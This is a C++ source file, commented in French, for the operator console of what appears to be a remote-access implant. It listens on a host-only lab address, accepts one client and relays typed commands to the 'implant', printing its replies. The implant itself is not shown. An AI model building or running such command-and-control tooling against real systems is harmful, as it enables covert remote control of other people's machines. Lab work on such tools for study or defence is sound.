#pragma comment(lib, "Ws2_32.lib")

#include <iostream>
#include <string>

#include <winsock2.h>

#include "network.hpp"
#include "protocol.hpp"

int main()
{
    // Initialisation de Winsock
    WSADATA wsaData{};

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed: "
                  << WSAGetLastError()
                  << std::endl;

        return 1;
    }

    // Création et configuration du serveur
    SOCKET serverSocket = createServerSocket();

    if (serverSocket == INVALID_SOCKET)
    {
        WSACleanup();
        return 1;
    }

    std::cout << "Server is listening on 192.168.56.1:5000"
              << std::endl;

    // Attente d'un client
    SOCKET clientSocket = acceptClient(serverSocket);

    if (clientSocket == INVALID_SOCKET)
    {
        closeSocket(serverSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "Client connected."
              << std::endl;

    // Boucle principale du contrôleur
    while (true)
    {
        Command command;
        std::string input;

        std::cout << "Enter command (or 'exit' to quit): ";
        std::getline(std::cin, input);

        // Analyser l'entrée de l'utilisateur
        size_t spacePos = input.find(' ');
        if (spacePos != std::string::npos)
        {
            command.name = input.substr(0, spacePos);
            command.argument = input.substr(spacePos + 1);
        }
        else
        {
            command.name = input;
            command.argument = "";
        }

        if (command.name == "exit")
        {
            break;
        }

        // Envoi de la commande structurée
        if (!sendCommand(clientSocket, command))
        {
            break;
        }

        // Réception de la réponse
        std::string response;
        MessageType responseType;

        if (!receiveMessage(clientSocket, response, responseType))
        {
            break;
        }

        if (responseType == MessageType::Error)
        {
            std::cerr << "Erreur de l'implant : "
                      << response
                      << std::endl;
        }
        else
        {
            std::cout << response << std::endl;
        }
    }

    // Nettoyage
    closeSocket(clientSocket);
    closeSocket(serverSocket);

    WSACleanup();

    return 0;
}